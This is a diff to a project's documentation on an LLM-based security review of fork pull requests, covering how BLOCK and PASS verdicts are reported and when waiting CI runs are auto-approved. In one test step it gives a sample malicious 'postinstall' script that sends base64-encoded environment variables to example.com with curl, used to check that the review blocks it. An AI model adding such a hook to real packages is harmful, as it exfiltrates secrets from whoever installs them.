@@ -35,17 +35,20 @@ tests (`.github/codeql/codeql-config.yml`).
    changed files next to the checkout, and has the review agent read them. A
    BLOCK verdict, no verdict, or a session with more than read-only tools fails
    the check.
-3. **`comment`** posts the verdict and the findings on the pull request as one
-   comment. Later runs update the same comment.
-4. **`approve-fork-runs`** runs on PASS only, and only if the pull request
-   changes nothing under `.github/`. It lists the runs with `head_sha` = C that
-   wait for approval, keeps those whose head repository is the pull request's
-   (compared by id), and approves each one
+3. **`comment`** reports on the pull request only when the review did not
+   pass. On BLOCK it submits a review that requests changes on C, with the
+   findings. With no verdict it posts one comment that says why, which later
+   runs update; nothing is asked of the author then. On PASS it posts nothing,
+   and dismisses the changes earlier runs requested.
+4. **`approve-fork-runs`** runs for a fork's pull request on PASS only, and
+   only if it changes nothing under `.github/`. It lists the runs with
+   `head_sha` = C that wait for approval, keeps those whose head repository is
+   the pull request's (compared by id), and approves each one
    (`POST /repos/{owner}/{repo}/actions/runs/{id}/approve`,
    [`.github/scripts/approve-fork-runs.sh`](../.github/scripts/approve-fork-runs.sh)).
    C's runs now start.
-5. On BLOCK or an error nothing is approved. The comment says why, and C's runs
-   keep waiting for a maintainer (see [When the review blocks or fails](#when-the-review-blocks-or-fails)).
+5. On BLOCK or an error nothing is approved. The review or comment says why,
+   and C's runs keep waiting for a maintainer (see [When the review blocks or fails](#when-the-review-blocks-or-fails)).
    The same goes for a pull request that changes anything under `.github/`,
    whatever the verdict. Those files decide which jobs CI runs, under which
    names and with which triggers, so a person approves them.
@@ -66,7 +69,7 @@ pull request is reviewed at once only when its author has had a commit merged
 here (`author_association` is `CONTRIBUTOR`, `COLLABORATOR`, `MEMBER` or
 `OWNER`). Any other author's (`FIRST_TIME_CONTRIBUTOR`, `FIRST_TIMER`, `NONE`)
 review fails at its first step, before the checkout and the gateway proxy, and
-the comment says that it waits for a maintainer. A maintainer reads the pull
+its comment says that it waits for a maintainer. A maintainer reads the pull
 request and starts the review with **Re-run all jobs**. Only someone with write
 access can re-run a run, so the job takes a second attempt as a maintainer's
 go-ahead. Each push makes a new run, which waits again.
@@ -281,9 +284,9 @@ scoped to the pull request, and put their checks on its commit.
 
 ## When the review blocks or fails
 
-- Read the comment and the run. A BLOCK names its findings. With no verdict,
-  the run says why (the gateway, the model, a transcript that could not be
-  checked).
+- Read the review or comment and the run. A BLOCK requests changes and names
+  its findings. With no verdict, the run says why (the gateway, the model, a
+  transcript that could not be checked).
 - To run the review again, or to start a first-time contributor's: open the
   pull request's `llm-security-review` run and choose **Re-run all jobs**. A
   PASS approves the waiting runs. Approving the runs by hand instead leaves the
@@ -309,7 +312,7 @@ for example a throwaway account.
    `git commit -s`, then open a pull request against `getdroppen/droppen:main`.
 2. The account has had nothing merged, so on the pull request, under Checks,
    check that:
-   - `llm-security-review` failed at its first step, and the comment says the
+   - `llm-security-review` failed at its first step, and a comment says the
      review waits for a maintainer;
    - `ci` and `pr-guard` show as waiting for approval.
 
@@ -326,7 +329,7 @@ for example a throwaway account.
    The review run is `pull_request_target`, `in_progress`. Every other run is
    `completed`, `action_required`.
 3. When the review passes, check four things:
-   - the comment appears;
+   - the waiting comment is gone, and no review or comment says PASS;
    - `approve-fork-runs` logs `approved run <id>` for each waiting run;
    - those runs start;
    - the check `llm-security-review` appears on the pull request's commit and
@@ -338,13 +341,13 @@ for example a throwaway account.
 5. Push a commit that should block, for example a `postinstall` script in
    `package.json` that runs `curl https://example.com/$(env | base64)`. Check
    three things:
-   - the review says BLOCK in its comment;
+   - the review requests changes and says BLOCK;
    - `approve-fork-runs` is skipped;
    - the runs stay `action_required`.
 6. Revert that, and push a harmless change under `.github/`, for example a
-   comment in `.github/workflows/pr-guard.yml`. The review may pass, but the
-   comment says that a maintainer approves, `approve-fork-runs` is skipped, and
-   the runs stay `action_required`.
+   comment in `.github/workflows/pr-guard.yml`. The review may pass, but
+   `approve-fork-runs` is skipped, and the runs stay `action_required` for a
+   maintainer.
 7. If step 3 shows `could not approve run` (GitHub refused the job's token),
    set `FORK_RUN_APPROVER_TOKEN` (above) and re-run the review.
 8. Close the pull request, and delete the fork and the account.
